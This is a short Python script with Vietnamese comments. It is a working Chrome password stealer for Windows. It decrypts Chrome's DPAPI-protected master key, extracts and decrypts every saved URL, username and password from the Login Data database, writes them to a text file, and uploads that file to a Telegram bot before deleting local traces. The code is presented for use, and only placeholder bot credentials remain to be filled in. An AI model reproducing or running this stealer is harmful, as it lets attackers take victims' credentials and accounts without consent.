import os
import sqlite3
import win32crypt
import json
import base64
import shutil
from Cryptodome.Cipher import AES
import requests

# === Cấu hình Telegram ===
BOT_TOKEN = 'YOUR_BOT_TOKEN'
CHAT_ID = 'YOUR_CHAT_ID'

# === Hàm gửi file lên Telegram ===
def send_to_telegram(file_path):
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendDocument'
    files = {'document': open(file_path, 'rb')}
    data = {'chat_id': CHAT_ID}
    response = requests.post(url, files=files, data=data)
    print(response.text)

# === Giải mã AES Key ===
def get_master_key():
    local_state_path = os.path.join(os.environ['LOCALAPPDATA'], r'Google\Chrome\User Data\Local State')
    with open(local_state_path, "r", encoding='utf-8') as file:
        local_state = json.loads(file.read())
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    encrypted_key = encrypted_key[5:]  # remove DPAPI prefix
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
        return decrypted_pass
    except Exception as e:
        return "Cannot decrypt"

# === Hàm chính lấy pass ===
def get_chrome_passwords():
    master_key = get_master_key()
    login_db = os.environ['LOCALAPPDATA'] + r"\Google\Chrome\User Data\default\Login Data"
    filename = "ChromePasswords.db"
    shutil.copy2(login_db, filename)

    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    
    with open("passwords.txt", "w", encoding='utf-8') as f:
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_password = row[2]
            
            if encrypted_password[:3] == b'v10':
                decrypted_password = decrypt_password(encrypted_password, master_key)
            else:
                decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
            
            f.write(f"URL: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
    
    cursor.close()
    db.close()
    os.remove(filename)
    
    # Gửi file passwords.txt qua Telegram
    send_to_telegram("passwords.txt")
    os.remove("passwords.txt")

# === Chạy ===
get_chrome_passwords()
